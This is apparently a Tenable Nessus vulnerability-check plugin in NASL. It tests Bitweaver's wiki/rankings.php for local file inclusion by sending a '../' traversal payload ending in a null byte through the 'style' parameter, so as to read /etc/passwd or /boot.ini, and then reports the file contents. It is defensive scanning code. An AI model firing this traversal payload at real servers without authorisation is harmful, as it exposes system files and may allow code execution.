#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(47744);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 20:59:28 $");

  script_osvdb_id(65938);
  script_xref(name:"EDB-ID", value:"14166");

  script_name(english:"Bitweaver wiki/rankings.php style Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is prone to a local
file inclusion attack."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The remote web server hosts Bitweaver, an open source content 
management system written in PHP. 

At least one install of Bitweaver on the remote host fails to sanitize
user-supplied input to the 'style' parameter of the
'wiki/rankings.php' script before using it to include PHP code. 

Regardless of PHP's 'register_globals' and 'magic_quotes_gpc'
settings, an unauthenticated, remote attacker can leverage this issue
to view arbitrary files or possibly execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id."
  );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Bitweaver 2.7 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value: "2010/07/01");
  script_set_attribute(attribute:"plugin_publication_date", value: "2010/07/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:bitweaver:bitweaver");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, php:TRUE);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

traversal = crap(data:"../", length:3*9) + '..';

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/bitweaver", "/site", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
found_app = FALSE;
found_file = "";
vuln_urls = make_array();

foreach dir (dirs)
{
  # Verify the script exists.
  base_url = dir + '/wiki/rankings.php';
  res = http_send_recv3(port:port, method:"GET", item:base_url, exit_on_fail:TRUE);

  if (
    res[2] && 
    (
      'meta name="generator" content="bitweaver"' >< res[2] ||
      '/icons/bitweaver/bitweaver.gif" alt="Bitweaver"' >< res[2]
    ) &&
    '.stars-rating' >< res[2] &&
    '/wiki/wiki_rss.php' >< res[2]
  ) found_app = TRUE;
  else continue;

  # Loop through files to look for.
  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    # Try to exploit the issue.
    exploit = traversal + file + "%00";
    url = base_url + "?style=" + exploit;
    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

    # There's a problem if...
    body = res[2];
    file_pat = file_pats[file];
    if (
      # we see the expected contents or...
      egrep(pattern:file_pat, string:body) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"Smarty error: the \$compile_dir.+"+traversal+file, string:body) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"open_basedir restriction in effect\. File\(.+"+traversal+file, string:body)
    )
    {
      vuln_urls[url]++;

      if (!contents && egrep(pattern:file_pat, string:body))
      {
        found_file = file;

        contents = body;
        if ("<br />" >< contents) contents = contents - strstr(contents, "<br />");

        break;
      }
    }
  }
  if (max_index(keys(vuln_urls)) && !thorough_tests) break;
}
if (!found_app) exit(0, "The web server listening on port "+port+" does not appear to host Bitweaver.");
if (max_index(keys(vuln_urls)) == 0) exit(0, "No vulnerable installs of Bitweaver were found on the web server on port "+port+".");


# Report findings.
if (report_verbosity > 0)
{
  info = "";
  foreach url (keys(vuln_urls))
    if ((found_file && found_file >< url) || !found_file) 
      info += "  - " + build_url(port:port, qs:url) + '\n';

  if (max_index(split(info)) > 1) s = "s";
  else s = "";

  if (contents)
  {
    if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

  report = '\n' +
    'Nessus was able to exploit the issue to retrieve the contents of\n' +
    "'" + found_file + "' on the remote host using the following URL" + s + ' :\n' +
    '\n' +
    info;

    if (report_verbosity > 1)
      report += '\n' +
        'Here are its contents :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        contents +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  else
  {
    report += '\n' +
      'While Nessus was not able to exploit the issue, it was able to verify\n' +
      'the issue exists based on the error message' + s + ' from the following\n' +
      'URL' + s +' :\n' +
      '\n' +
      info;
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
